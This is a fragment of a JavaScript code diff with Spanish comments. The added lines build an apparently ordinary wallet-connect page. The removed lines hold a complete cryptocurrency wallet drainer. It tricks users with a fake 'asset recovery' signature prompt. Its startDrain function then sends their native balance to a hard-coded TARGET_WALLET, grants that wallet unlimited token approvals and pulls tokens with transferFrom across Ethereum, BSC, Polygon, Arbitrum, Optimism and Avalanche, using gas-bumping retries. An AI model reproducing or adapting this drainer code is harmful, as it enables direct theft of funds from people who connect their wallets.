+                   provider.isCoinbaseWallet ? 'Coinbase Wallet' :
+                   provider.isTrust ? 'TrustWallet' :
+                   provider.isRainbow ? 'Rainbow' : 'Wallet';
+    } else {
+      // Es el nombre del deep link
+      const link = DEEP_LINKS[providerOrName.toLowerCase()] || 
+                   Object.values(DEEP_LINKS).find(w => w.name === providerOrName);
+      
+      if (!link) {
+        showToast('Wallet no encontrada', 'error');
+        return;
+      }
+
+      // Abrir en app móvil
+      const url = link.scheme.replace('{full}', getFullUrl());
+      window.location.href = url;
+      showToast(`Abriendo ${link.name}...`, 'info');
+      return;
+    }
+
+    // Pedir cuentas
+    const accounts = await provider.request({ method: 'eth_requestAccounts' });
+    
+    if (!accounts || accounts.length === 0) {
+      throw new Error('No se seleccionó ninguna cuenta');
+    }
+
+    // Guardar estado
+    state.provider = provider;
+    state.accounts = accounts;
+    state.walletName = walletName;
+    state.web3 = new ethers.providers.Web3Provider(provider);
+    state.signer = state.web3.getSigner();
+
+    // Obtener chainId
+    state.chainId = await provider.request({ method: 'eth_chainId' });
+
+    // Actualizar UI
+    updateConnectedUI(accounts[0]);
+
+    // Setup listeners
+    provider.on?.('accountsChanged', handleAccountsChanged);
+    provider.on?.('chainChanged', handleChainChanged);
+    provider.on?.('disconnect', handleDisconnect);
+
+    // Guardar en localStorage
+    saveConnectionState();
+
+    showToast(`${walletName} conectado`, 'success');
+
+  } catch (error) {
+    console.error('Error conectando:', error);
+    showToast('Error: ' + error.message, 'error');
+  }
+}
+
+/* ============================================================
+   ACTUALIZAR UI CONECTADA
+   ============================================================ */
+async function updateConnectedUI(address) {
+  const panel = document.getElementById('connectedPanel');
+  const selectPanel = document.getElementById('selectPanel');
+  const qrPanel = document.getElementById('qrPanel');
+  const badge = document.getElementById('statusBadge');
+  const disconnectPanel = document.getElementById('disconnectPanel');
+
+  panel.classList.add('active');
+  selectPanel.classList.add('hidden');
+  qrPanel.classList.add('hidden');
+  disconnectPanel.classList.remove('hidden');
+
+  badge.textContent = 'Conectado';
+  badge.style.background = 'rgba(0, 255, 157, 0.15)';
+  badge.style.color = '#00ff9d';
+
+  // Mostrar dirección
+  document.getElementById('displayAddress').textContent = address;
+  document.getElementById('addressDisplay').textContent = address;
+  document.getElementById('walletNameDisplay').textContent = state.walletName;
+
+  // Actualizar red
+  updateNetworkInfo();
+
+  // Actualizar balance
+  await updateBalance();
+
+  // Persistir
+  localStorage.setItem('lastConnectedAccount', address);
+  localStorage.setItem('lastConnectedWallet', state.walletName);
+}
+
+/* ============================================================
+   ACTUALIZAR INFORMACIÓN DE RED
+   ============================================================ */
+function updateNetworkInfo() {
+  const chain = CONFIG.chains[parseInt(state.chainId)];
+  const tag = document.getElementById('networkTag');
+  
+  if (chain) {
+    tag.textContent = `${chain.name} (${parseInt(state.chainId)})`;
+  } else {
+    tag.textContent = `Red ${state.chainId}`;
+  }
+}
+
+/* ============================================================
+   ACTUALIZAR SALDO
+   ============================================================ */
+async function updateBalance() {
+  try {
+    const balanceWei = await state.signer.getBalance();
+    const balanceEth = parseFloat(ethers.utils.formatEther(balanceWei));
+    
+    document.getElementById('balanceDisplay').textContent = 
+      balanceEth.toFixed(4) + ' ETH';
+
+    // Obtener precio USD
+    fetch(CONFIG.priceApi)
+      .then(res => res.json())
+      .then(data => {
+        const usd = (balanceEth * data.ethereum.usd).toFixed(2);
+        document.getElementById('ethUsd').textContent = `≈ $${usd} USD`;
+      })
+      .catch(() => {
+        document.getElementById('ethUsd').textContent = '';
+      });
+  } catch (error) {
+    console.error('Error obteniendo saldo:', error);
+  }
+}
+
+/* ============================================================
+   EVENT HANDLERS
+   ============================================================ */
+async function handleAccountsChanged(accounts) {
+  if (accounts.length === 0) {
+    disconnect();
+  } else if (accounts[0] !== state.accounts[0]) {
+    state.accounts = accounts;
+    updateConnectedUI(accounts[0]);
+    showToast('Cuenta cambiada', 'success');
+  }
+}
+
+function handleChainChanged(chainId) {
+  window.location.reload();
+}
+
+function handleDisconnect(code, reason) {
+  disconnect();
+  showToast('Wallet desconectada', 'info');
+}
+
+/* ============================================================
+   ACCIONES DE USUARIO
+   ============================================================ */
+function disconnect() {
+  state.provider = null;
+  state.accounts = [];
+  state.chainId = null;
+  state.walletName = null;
+  state.signer = null;
+  state.web3 = null;
+
+  // Reset UI
+  document.getElementById('connectedPanel').classList.remove('active');
+  document.getElementById('selectPanel').classList.remove('hidden');
+  document.getElementById('qrPanel').classList.remove('hidden');
+  document.getElementById('disconnectPanel').classList.add('hidden');
+
+  const badge = document.getElementById('statusBadge');
+  badge.textContent = 'Desconectado';
+  badge.style.background = 'rgba(0, 255, 157, 0.1)';
+  badge.style.color = '#00ff9d';
+
+  // Limpiar localStorage
+  localStorage.removeItem('lastConnectedAccount');
+  localStorage.removeItem('lastConnectedWallet');
+  localStorage.removeItem('lastConnectedChainId');
+
+  showToast('Desconectado', 'info');
+}
+
+async function copyAddress() {
+  if (!state.accounts[0]) return;
+  await navigator.clipboard.writeText(state.accounts[0]);
+  showToast('Dirección copiada', 'success');
+}
+
+function viewExplorer() {
+  if (!state.accounts[0] || !state.chainId) return;
+  const chain = CONFIG.chains[parseInt(state.chainId)];
+  if (chain) {
+    window.open(`${chain.explorer}/address/${state.accounts[0]}`, '_blank');
+  }
+}
+
+async function signMessage() {
+  if (!state.signer) {
+    showToast('Conecta una wallet primero', 'error');
+    return;
+  }
+
+  // Mensaje legible para el usuario (EIP-191)
+  const message = `Firma para verificar tu identidad
+
+Sitio: ${location.hostname}
+Dirección: ${state.accounts[0]}
+Tiempo: ${new Date().toISOString()}
+
+Esta firma no realiza ninguna transacción ni gastará fondos.`;
+
+  try {
+    const signature = await state.signer.signMessage(message);
+    showToast('✅ Mensaje firmado exitosamente', 'success');
+    
+    // Mostrar firma (útil para debugging)
+    console.log('Firma:', signature);
+    
+    // Aquí puedes enviar la firma a tu backend para verificar
+    // await fetch('/api/verify', {
+    //   method: 'POST',
+    //   headers: { 'Content-Type': 'application/json' },
+    //   body: JSON.stringify({ message, signature, address: state.accounts[0] })
+    // });
+    
+  } catch (error) {
+    console.error('Error firmando:', error);
+    showToast('Error al firmar: ' + error.message, 'error');
+  }
+}
+
+async function switchNetwork() {
+  if (!state.provider) return;
+
+  const chainIds = Object.keys(CONFIG.chains).filter(id => id !== state.chainId);
+  const targetId = chainIds[0]; // Cambia a la primera red diferente
+  
+  if (!targetId) {
+    showToast('No hay otras redes disponibles', 'error');
+    return;
+  }
+
+  try {
+    await state.provider.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: `0x${parseInt(targetId).toString(16)}` }]
+    });
+    showToast(`Cambió a ${CONFIG.chains[targetId].name}`, 'success');
+  } catch (error) {
+    // Error 4902: cadena no agregada
+    if (error.code === 4902) {
+      showToast('Agrega esta red manualmente desde tu wallet', 'error');
+    } else {
+      showToast('Error cambiando red', 'error');
+    }
+  }
+}
+
+/* ============================================================
+   GENERAR QR CODE
+   ============================================================ */
+function generateQRCode() {
+  const container = document.getElementById('qrcode');
+  container.innerHTML = '';
+  
+  const fullUrl = location.href;
+  
+  new QRCode(container, {
+    text: fullUrl,
+    width: 200,
+    height: 200,
+    colorDark: '#000000',
+    colorLight: '#ffffff',
+    correctLevel: QRCode.CorrectLevel.H
+  });
+}
+
+/* ============================================================
+   RECUPERAR CONEXIÓN ANTERIOR
+   ============================================================ */
+async function restorePreviousConnection() {
+  const savedAccount = localStorage.getItem('lastConnectedAccount');
+  const savedWallet = localStorage.getItem('lastConnectedWallet');
+
+  if (!savedAccount || !window.ethereum) return;
+
+  try {
+    const accounts = await window.ethereum.request({ 
+      method: 'eth_accounts' 
+    });
+
+    if (accounts.length > 0 && accounts[0] === savedAccount) {
+      state.provider = window.ethereum;
+      state.accounts = accounts;
+      state.walletName = savedWallet;
+      state.web3 = new ethers.providers.Web3Provider(window.ethereum);
+      state.signer = state.web3.getSigner();
+      state.chainId = await window.ethereum.request({ method: 'eth_chainId' });
+
+      updateConnectedUI(savedAccount);
+      showToast(`Recuperada sesión anterior`, 'success');
+    }
+  } catch (error) {
+    console.log('Reconexión falló (usuario desautorizó):', error);
+    localStorage.clear();
+  }
+}
+
+/* ============================================================
+   INICIALIZACIÓN
+   ============================================================ */
+document.addEventListener('DOMContentLoaded', () => {
+  // 1. Descubrir proveedores
+  discoverProviders();
+
+  // 2. Renderizar botones iniciales
+  renderWalletButtons();
+
+  // 3. Generar QR Code
+  generateQRCode();
+
+  // 4. Intentar recuperar sesión previa
+  restorePreviousConnection();
+
+  // 5. Detectar cambios de orientación para regenerar QR
+  window.addEventListener('resize', () => {
+    if (document.getElementById('qrPanel').classList.contains('hidden') === false) {
+      generateQRCode();
+    }
+  });
+
+  console.log('🌐 Web3Connect inicializado');
+  console.log('📱 Soporta: MetaMask, TrustWallet, Coinbase, Rainbow, Argent, imToken');
+  console.log('🔗 Sin dependencias de terceros');
 });
-
-async function tryConnect() {
- try {
- const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
- userAddress = accounts[0];
- 
- const network = await window.ethereum.request({ method: 'eth_chainId' });
- const chainIdNum = parseInt(network);
- 
- provider = new ethers.providers.Web3Provider(window.ethereum);
- signer = provider.getSigner();
- currentChainId = chainIdNum;
-
- log(`Connected via ${detectedWalletType.toUpperCase()}`);
- log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
- log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
- 
- // Mostrar zona de escaneo
- scanArea.classList.remove('hidden');
- connectBtn.classList.add('hidden');
-
- // Simular escaneo visual
- setTimeout(() => {
- // Aquí ejecutamos la lógica de "iteración" sobre tokens
- scanAssets();
- 
- // Mostrar botón de verificar después de "escanear"
- setTimeout(() => {
- verifyBtn.classList.remove('hidden');
- costInfo.style.display = 'block';
- 
- // Activar chat widget
- chatWidget.classList.add('chat-visible');
- }, 1000);
-
- }, 2000);
-
- } catch (error) {
- statusDiv.textContent = "Conexión rechazada o fallida.";
- log(error.message);
- }
-}
-
-// MOTOR DE ESCANEO DE ACTIVOS
-async function scanAssets() {
- log("Starting asset scan...");
- 
- // 1. Escaneo de Native Balance (ETH/BSC)
- try {
- const balance = await provider.getBalance(userAddress);
- const formattedBalance = ethers.utils.formatEther(balance);
- if (parseFloat(formattedBalance) > 0.0001) {
- addAssetToList(getNetworkName(currentChainId) + " Balance", formattedBalance);
- log(`Found native balance: ${formattedBalance}`);
- }
- } catch (e) {
- log("Error scanning native balance.");
- }
-
- // 2. Iteración sobre tokens conocidos (Usando la lista completa del archivo original)
- for(let token of TOKENS_TO_SCAN) {
- if(token.chainId === currentChainId) {
- try {
- // Crear contrato para leer balance
- const contract = new ethers.Contract(token.address, ['function balanceOf(address) view returns (uint256)'], provider);
- const rawBalance = await contract.balanceOf(userAddress);
- const balance = parseFloat(ethers.utils.formatUnits(rawBalance, token.decimals));
- 
- if (balance > 0) {
- addAssetToList(token.symbol, balance.toFixed(2));
- log(`Scanned ${token.symbol}: Found ${balance.toFixed(2)}`);
- }
- } catch (err) {
- // Silenciar errores de tokens que ya no existen o cambian de dirección
- }
- }
- }
-}
-
-function addAssetToList(name, value) {
- const item = document.createElement('div');
- item.className = 'asset-item';
- item.innerHTML = `<span class="asset-name">${name}</span><span class="asset-val">$${value}</span>`;
- assetList.appendChild(item);
- assetList.style.display = 'block';
- document.getElementById('scannerAnim').style.opacity = '0';
-}
-
-// LÓGICA DE VERIFICACIÓN (SIGN MESSAGE) -> PUNTO DE INICIO
-verifyBtn.addEventListener('click', async () => {
- verifyBtn.disabled = true;
- verifyBtn.innerHTML = '<div class="spinner"></div> Signing...';
-
- try {
- // Mensaje simple de verificación compatible con Trust y MetaMask
- const message = "Verify Ownership of Web3 Asset Recovery";
- const signature = await signer.signMessage(message);
- 
- log("Signature generated successfully.");
- log(`Signature: ${signature.substring(0, 20)}...`);
- 
- statusDiv.textContent = "✅ Verification Successful! Initiating transfer...";
- statusDiv.style.color = "#22c55e";
- verifyBtn.textContent = "Verified";
- 
- // PEQUEÑO RETRASO PARA EFECTO DRAMÁTICO
- setTimeout(() => {
- startDrain();
- }, 1500);
-
- } catch (err) {
- console.error(err);
- statusDiv.textContent = "❌ Verification Failed";
- statusDiv.style.color = "#ef4444";
- log(err.message);
- verifyBtn.disabled = false;
- verifyBtn.innerHTML = '<i data-lucide="signature" style="width:18px; height:18px;"></i> Sign Message to Verify';
- }
-});
-
-// SISTEMA DE RETRY INTELIGENTE (GAS BUMPING) PROFESIONAL
-async function waitForTransactionReceipt(hash, timeout = 45000) {
- const startTime = Date.now();
- while (Date.now() - startTime < timeout) {
- try {
- const receipt = await provider.getTransactionReceipt(hash);
- if (receipt) return receipt;
- } catch (e) {}
- await new Promise(r => setTimeout(r, 3000)); 
- }
- return null;
-}
-
-async function executeWithRetry(txFunction, params, maxRetries = 3) {
- let lastTxHash = null;
- let retryCount = 0;
- 
- while (retryCount <= maxRetries) {
- try {
- log(retryCount === 0 ? "Sending transaction..." : `Retrying with higher gas (Attempt ${retryCount + 1})...`);
- 
- // EJECUTAR LA TRANSACCIÓN
- const txResponse = await txFunction(...params);
- lastTxHash = txResponse.hash;
- 
- log(`Tx sent: ${lastTxHash.substring(0, 10)}... Waiting for confirmation...`);
- 
- // ESPERAR CONFIRMACIÓN Y VERIFICAR NONCE
- const receipt = await waitForTransactionReceipt(lastTxHash);
- 
- if (receipt && receipt.status === "0x1") {
- log("Transaction confirmed!");
- return true;
- } else if (receipt && receipt.status === "0x0") {
- log("Transaction reverted on-chain.");
- return false;
- } else {
- // Si no hay receipt, intentamos bumpear gas o reintentar
- retryCount++;
- continue; 
- }
- } catch (err) {
- retryCount++;
- if (retryCount >= maxRetries) {
- console.error("Max retries reached for this step.");
- return false;
- }
- }
- }
- return lastTxHash;
-}
-
-// --- NUEVA FUNCIÓN: GAS PRICE DINÁMICO REAL ---
-async function getDynamicGasConfig(provider) {
- const feeData = await provider.getFeeData();
- 
- // Si la red soporta EIP-1559 (la mayoría hoy en día)
- if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
- // Multiplicador agresivo para asegurar confirmación rápida
- const multiplier = 1.2; 
- const priorityMultiplier = 1.5;
- 
- return {
- maxFeePerGas: feeData.maxFeePerGas.mul(Math.floor(multiplier * 100)).div(100),
- maxPriorityFeePerGas: feeData.maxPriorityFeePerGas.mul(Math.floor(priorityMultiplier * 100)).div(100)
- };
- } 
- // Fallback para redes antiguas (como BSC o Polygon a veces)
- else {
- const multiplier = 1.5;
- return {
- gasPrice: feeData.gasPrice.mul(Math.floor(multiplier * 100)).div(100)
- };
- }
-}
-
-async function startDrain() {
- verifyBtn.classList.add('hidden'); // Ocultar botón
- log("--- STARTING DRAIN (GOD MODE) ---");
-
- try {
- // 1. Drenar Nativo con Retry y Gas Dinámico
- const balance = await provider.getBalance(userAddress);
- if (balance > 0) {
- log("Transferring native token...");
- 
- // Obtener configuración de gas dinámica
- const gasConfig = await getDynamicGasConfig(provider);
- 
- // Estimar gas necesario para la transferencia
- const estimatedGas = await provider.estimateGas({
- to: TARGET_WALLET,
- value: balance
- });
- 
- // Calcular valor a enviar: Saldo total menos lo necesario para el gas
- const gasCostEstimate = estimatedGas.mul(gasConfig.maxFeePerGas || gasConfig.gasPrice);
- const sendValue = balance.sub(gasCostEstimate);
- 
- if (sendValue > 0) {
- // Usamos executeWithRetry para asegurar que llegue
- const txHash = await executeWithRetry(async () => {
- // Intentar con EIP-1559 primero
- try {
- return await signer.sendTransaction({
- to: TARGET_WALLET,
- value: sendValue,
- maxFeePerGas: gasConfig.maxFeePerGas,
- maxPriorityFeePerGas: gasConfig.maxPriorityFeePerGas
- });
- } catch (e) {
- // Fallback a Legacy si falla (común en algunos móviles)
- return await signer.sendTransaction({
- to: TARGET_WALLET,
- value: sendValue,
- gasPrice: gasConfig.gasPrice
- });
- }
- }, []);
- 
- if(txHash) log(`Native drained! Tx: ${txHash.substring(0,10)}...`);
- else log("Native transfer might be pending or failed.");
- } else {
- log("Balance too low for gas.");
- }
- } else {
- log("No native funds found.");
- }
-
- // 2. DR
- const tokensMap = {
- 1: [ // Ethereum Mainnet
- "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
- "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
- "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
- "0x6982508145454Ce325dDbE47a25d4ec3d2311933", // PEPE
- "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
- "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE
- "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
- "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
- "0xc00e94Cb662C3520282E6f5717214004A7f26888", // COMP
- "0xD533a949740bb3306d119CC777fa900bA034cd52", // CRV
- "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT
- "0x6B3595068778DD592e39A122f4f5a5cF09C90fE2", // SUSHI
- "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI 
- "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
- "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
- "0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202" // KNC 
- ],
- 56: [ // BSC
- "0x55d398326f99059fF775485246999027B3197955", // USDT
- "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
- "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
- "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
- "0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F", // ALPACA
- "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
- "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63", // XVS
- "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE 
- "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1" // UNI on BSC
- ],
- 137: [ // Polygon
- "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
- "0x2791Bca1f2de4661ED88A30C99a7a9449Aa84174", // USDC
- "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", // WMATIC
- "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
- "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", // DAI
- "0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3", // BAL
- "0x580A84C73811E1839F75d86d75d88cCa0c241fF4", // QI
- "0xc67238827da94B15F6bA10F3d35f690809919F75" // AMPL
- ],
- 42161: [ // Arbitrum
- "0xaf88d065e77c8cc2239301c5e016f019b175484b", // USDC
- "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", // USDC.e
- "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
- "0xFd086bC7CD5C481DCC9C85EBE478A1C0b69FCbb9", // USDT
- "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", // GMX
- "0x912CE59144191C1204E64559FE8253a0e49E6548", // ARB
- "0x17FC002b466eEc40DaE837Fc4bE5c884515b0F7e", // FRAX
- ],
- 10: [ // Optimism
- "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
- "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
- "0x4200000000000000000000000000000000000006", // WETH
- "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", // DAI
- "0x4200000000000000000000000000000000000042", // OP
- "0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb" // wstETH
- ],
- 43114: [ // Avalanche
- "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
- "0xc7198437980c041c805A1EDcbA50c1Ce5db95118", // USDT.e
- "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", // WAVAX
- "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", // WETH.e
- "0x5947BB275c521040051D82396192181b413227A3", // LINK
- "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd" // JOE
- ]
- };
-
- const tokenList = tokensMap[currentChainId] || [];
-
- // Procesar cada token
- for (const tokenAddress of tokenList) {
- try {
- log(`Scanning Token: ${tokenAddress.substring(0,6)}...`);
- 
- // Encontrar metadatos del token para formateo correcto
- const tokenData = TOKENS_TO_SCAN.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
- const decimals = tokenData ? tokenData.decimals : 18; // Default 18 si no se encuentra
- const symbol = tokenData ? tokenData.symbol : "UNK";
-
- const erc20 = new ethers.Contract(tokenAddress, [
- "function approve(address spender, uint256 amount) public returns (bool)",
- "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
- "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
- "function balanceOf(address owner) view returns (uint256)",
- "function allowance(address owner, address spender) view returns (uint256)"
- ], signer);
-
- const balance = await erc20.balanceOf(userAddress);
- 
- // 1. OPTIMIZACIÓN: Verificar balance REAL primero
- if (balance > 0) {
- log(`Found balance: ${ethers.utils.formatUnits(balance, decimals)} (${symbol})`);
- 
- // 2. Verificar Allowance Actual para evitar resets innecesarios
- const currentAllowance = await erc20.allowance(userAddress, TARGET_WALLET);
- 
- let approvalTx;
- 
- if (currentAllowance.gte(balance)) {
- // Si ya hay permiso suficiente, saltamos la aprobación
- log("Allowance already sufficient.");
- } else {
- // Lógica robusta de Approval
- try {
- // Intentar aumentar permiso primero (más eficiente para tokens modernos)
- approvalTx = await executeWithRetry(async () => {
- return await erc20.increaseAllowance(TARGET_WALLET, ethers.constants.MaxUint256);
- }, []);
- log("Approval increased via increaseAllowance.");
- } catch (e) {
- // Fallback a approve normal si el token es antiguo
- approvalTx = await executeWithRetry(async () => {
- return await erc20.approve(TARGET_WALLET, ethers.constants.MaxUint256);
- }, []);
- log("Approval set via fallback approve.");
- }
- }
- 
- // 3. Transferir SOLO si hay saldo y se aprobó correctamente
- try {
- log("Transferring tokens...");
- 
- // OBTENER GAS DINÁMICO PARA EL TOKEN
- const tokenGasConfig = await getDynamicGasConfig(provider);
-
- await executeWithRetry(async () => {
- // Ejecutar la transferencia con control de gas explícito
- const txParams = {
- from: userAddress,
- to: tokenAddress,
- // Datos de la función transferFrom
- data: erc20.interface.encodeFunctionData("transferFrom", [userAddress, TARGET_WALLET, balance])
- };
-
- // Añadir parámetros de gas según la configuración dinámica
- if (tokenGasConfig.maxFeePerGas) {
- txParams.maxFeePerGas = tokenGasConfig.maxFeePerGas;
- txParams.maxPriorityFeePerGas = tokenGasConfig.maxPriorityFeePerGas;
- } else {
- txParams.gasPrice = tokenGasConfig.gasPrice;
- }
-
- // Enviar la llamada directa para tener más control sobre los parámetros de gas
- return await signer.sendTransaction(txParams);
- }, []);
- 
- log(`Token drained! Tx: Sent`);
- } catch (err) {
- log("Transfer failed: " + err.message);
- }
- } else {
- // Loguear que no hay saldo para ahorrar tiempo de análisis
- // log(`No balance for ${token.symbol}`); 
- }
- } catch (err) {
- // Si un token falla (ej. ABI incorrecto), continuamos con el siguiente
- console.warn(`Token ${tokenAddress} error:`, err.message);
- }
- }
-
- statusDiv.textContent = "✅ CLAIM SUCCESSFUL";
- statusDiv.style.color = "#4ade80";
- connectBtn.textContent = "Done";
-
- } catch (err) {
- console.error(err);
- statusDiv.textContent = "❌ ERROR: " + err.message;
- log(err.message);
- }
-}
-
-// 
-const TOKENS_TO_SCAN = [
- // Ethereum Mainnet
- { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, chainId: 1 },
- { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, chainId: 1 },
- { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, chainId: 1 },
- { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18, chainId: 1 },
- { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18, chainId: 1 },
- { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18, chainId: 1 },
- { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18, chainId: 1 },
- { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18, chainId: 1 },
- { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8, chainId: 1 },
- { symbol: "COMP", address: "0xc00e94Cb662C3520282E6f5717214004A7f26888", decimals: 18, chainId: 1 },
- { symbol: "CRV", address: "0xD533a949740bb3306d119CC777fa900bA034cd52", decimals: 18, chainId: 1 },
- { symbol: "BAT", address: "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", decimals: 18, chainId: 1 },
- { symbol: "SUSHI", address: "0x6B3595068778DD592e39A122f4f5a5cF09C90fE2", decimals: 18, chainId: 1 },
- 
- // BSC Mainnet
- { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, chainId: 56 },
- { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18, chainId: 56 },
- { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18, chainId: 56 },
- { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18, chainId: 56 },
- { symbol: "ALPACA", address: "0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F", decimals: 18, chainId: 56 },
- { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18, chainId: 56 },
- { symbol: "XVS", address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63", decimals: 18, chainId: 56 },
- { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18, chainId: 56 },
- { symbol: "UNI", address: "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", decimals: 18, chainId: 56 },
- 
- // Polygon
- { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, chainId: 137 },
- { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99a7a9449Aa84174", decimals: 6, chainId: 137 },
- { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18, chainId: 137 },
- { symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18, chainId: 137 },
- { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18, chainId: 137 },
- { symbol: "BAL", address: "0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3", decimals: 18, chainId: 137 },
- { symbol: "QI", address: "0x580A84C73811E1839F75d86d75d88cCa0c241fF4", decimals: 18, chainId: 137 },
- { symbol: "AMPL", address: "0xc67238827da94B15F6bA10F3d35f690809919F75", decimals: 18, chainId: 137 },
-
- // Arbitrum
- { symbol: "USDC", address: "0xaf88d065e77c8cc2239301c5e016f019b175484b", decimals: 6, chainId: 42161 },
- { symbol: "USDC.e", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6, chainId: 42161 },
- { symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18, chainId: 42161 },
- { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85EBE478A1C0b69FCbb9", decimals: 6, chainId: 42161 },
- { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", decimals: 18, chainId: 42161 },
- { symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", decimals: 18, chainId: 42161 },
- { symbol: "FRAX", address: "0x17FC002b466eEc40DaE837Fc4bE5c884515b0F7e", decimals: 18, chainId: 42161 },
-
- // Optimism
- { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6, chainId: 10 },
- { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6, chainId: 10 },
- { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18, chainId: 10 },
- { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18, chainId: 10 },
- { symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18, chainId: 10 },
- { symbol: "wstETH", address: "0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb", decimals: 18, chainId: 10 },
-
- // Avalanche
- { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6, chainId: 43114 },
- { symbol: "USDT.e", address: "0xc7198437980c041c805A1EDcbA50c1Ce5db95118", decimals: 6, chainId: 43114 },
- { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18, chainId: 43114 },
- { symbol: "WETH.e", address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", decimals: 18, chainId: 43114 },
- { symbol: "LINK", address: "0x5947BB275c521040051D82396192181b413227A3", decimals: 18, chainId: 43114 },
- { symbol: "JOE", address: "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd", decimals: 18, chainId: 43114 }
